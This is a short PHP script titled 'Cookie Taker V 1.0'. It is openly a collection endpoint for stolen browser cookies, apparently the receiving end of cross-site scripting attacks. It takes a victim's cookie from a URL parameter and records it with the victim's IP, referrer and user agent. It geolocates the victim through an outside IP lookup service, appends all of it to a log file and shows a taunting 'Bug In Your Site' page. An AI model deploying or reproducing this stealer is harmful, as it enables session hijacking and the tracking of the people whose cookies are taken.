<?php
#################################
#
#
# Cookie Taker V 1.0
# Made By Cyber Guy
#
################################
$cookie = "[+]Victim Cookie => [ " . $_GET['cookie'] . " ]";
$ip = "[+]Victim IP => [ " . $_SERVER['REMOTE_ADDR'] . " ]";
$ref = "[+]Victim Comes From => [ " . $_SERVER['HTTP_REFERER'] . " ]";
$uAgent = "[+]Victim Details => [ " . $_SERVER['HTTP_USER_AGENT'] . " ]";
$sNAME = "[+]Server Name => [ " . $_SERVER['SERVER_NAME'] . " ]";
$sIP = "[+]Server IP => [ " . $_SERVER['SERVER_ADDR'] . " ]";
function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$PublicIP = get_client_ip();
$json     = file_get_contents("http://ipinfo.io/$PublicIP/geo");
$json     = json_decode($json, true);
$country  = "User Country Is => " . $json['country'];
$region   = "User Reigon Is => " . $json['region'];
$city     = "User City Is => " . $json['city'];
$all = "\n----{Begin}----\n" . $cookie . "\n\n" . $ip . "\n\n" . $ref . "\n\n" . $uAgent . "\n\n" . $sNAME . "\n\n" . $sIP . "\n\n" . "----{LOCATION}---" . "\n\n" .$country . "\n" . $region . "\n" . $city . "\n\n" . "------{End}-----";
$handle = fopen('Log.txt', 'a');
fwrite($handle, $all);
fclose($handle);
?>
<!DOCTYPE html>
<html>
<head>
<title>You Have A Bug In YOur Site</title>
</head>
<body>
<center>
<p style='color:red'><b>Bug In Your Site</b></p>
</center>
</body>
</html>